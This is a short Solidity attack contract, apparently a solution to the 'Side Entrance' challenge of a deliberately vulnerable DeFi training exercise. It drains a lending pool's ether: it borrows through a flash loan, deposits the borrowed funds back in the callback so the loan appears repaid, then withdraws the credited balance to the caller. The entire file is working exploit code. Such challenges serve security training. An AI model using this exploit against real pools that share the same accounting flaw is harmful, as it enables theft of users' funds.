// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(1e21);
        pool.withdraw();
        payable(msg.sender).transfer(1e21);
    }

    function execute() external payable {
        pool.deposit{value: 1e21}();
    }

    receive() external payable {}
}
